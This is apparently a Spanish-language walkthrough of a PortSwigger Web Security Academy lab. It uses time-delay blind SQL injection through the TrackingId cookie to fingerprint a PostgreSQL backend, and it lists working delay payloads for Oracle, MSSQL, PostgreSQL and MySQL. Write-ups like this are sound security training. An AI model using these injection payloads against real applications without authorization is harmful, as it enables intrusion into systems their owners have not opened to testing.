# Blind SQL Injection with Time Delays

## 📌 Información del laboratorio

| Campo | Detalle |
|---|---|
| **Laboratorio** | Blind SQL Injection with Time Delays |
| **Categoría** | SQL Injection (Time Delay-Based) |
| **Técnica** | Time delay para confirmar ejecución de query |
| **Motor de base de datos** | PostgreSQL |
| **Plataforma** | PortSwigger Web Security Academy |

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

---

## 🎯 Objetivo

Lograr que el portal espere 10 segundos antes de devolver la respuesta, controlando la ejecución de la query a través del parámetro `TrackingId`.

Teniendo en cuenta que la estructura interna de la query es similar a esto:

```sql
SELECT * FROM trackId WHERE id = 'xas'
```

Puedo usar ese punto de entrada para inyectar funciones de delay según el motor de base de datos.

---

## 🔍 Detectando la vulnerabilidad

El punto de entrada es el parámetro `TrackingId`, una cookie que la aplicación usa para rastrear visitas. Intercepté la petición con Burp Suite e inyecté una comilla simple más doble guión para verificar que el input llega sin sanitización al backend:

```sql
ier2FXAWftQx2Y8s' --
```

La aplicación respondió sin ningún error, lo que confirma que el comentario SQL fue procesado correctamente.

---

## 🔎 Identificando el motor de base de datos (Fingerprinting)

Según el enunciado, el objetivo es provocar un delay de 10 segundos. Revisando el [Cheat Sheet de PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet), cada motor tiene su propia función para esto:

| Motor | Función de delay |
|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `pg_sleep(10)` |
| MySQL | `SLEEP(10)` |

Con el contexto de labs anteriores, los payloads quedarían así:

```sql
-- Oracle
xas' || (SELECT dbms_pipe.receive_message('a',10) FROM dual) --

-- Microsoft
xas'; WAITFOR DELAY '0:0:10' --

-- PostgreSQL
xas' || pg_sleep(10) --

-- MySQL
xas' AND SLEEP(10) --
```

---

### Prueba con Oracle

```sql
xas' || (SELECT dbms_pipe.receive_message('a',10) FROM dual) --
```

**Comportamiento:** No se produjo el delay de 10 segundos. Se descarta Oracle.

---

### Prueba con Microsoft

```sql
xas'; WAITFOR DELAY '0:0:10' --
```

**Comportamiento:** No se produjo el delay de 10 segundos. Se descarta Microsoft SQL Server.

---

### Prueba con MySQL

```sql
xas' AND SLEEP(10) --
```

**Comportamiento:** No se produjo el delay de 10 segundos. Se descarta MySQL.

---

### Prueba con PostgreSQL

```sql
xas' || pg_sleep(10) --
```

**Comportamiento:** El portal tardó exactamente 10 segundos en responder.

> ✅ **Motor confirmado: PostgreSQL**

---

## ✅ Resultado

Se logró controlar el tiempo de respuesta del servidor inyectando una función de delay a través del parámetro `TrackingId`.

El proceso completo fue:

1. Confirmar que el input llega sin sanitización al backend
2. Probar las funciones de delay de cada motor de base de datos en orden
3. Identificar PostgreSQL como el motor activo al obtener el delay esperado de 10 segundos

A diferencia de los labs anteriores donde los errores revelaban datos directamente, aqui la única señal disponible es el tiempo de respuesta, no hay output visible, solo comportamiento.
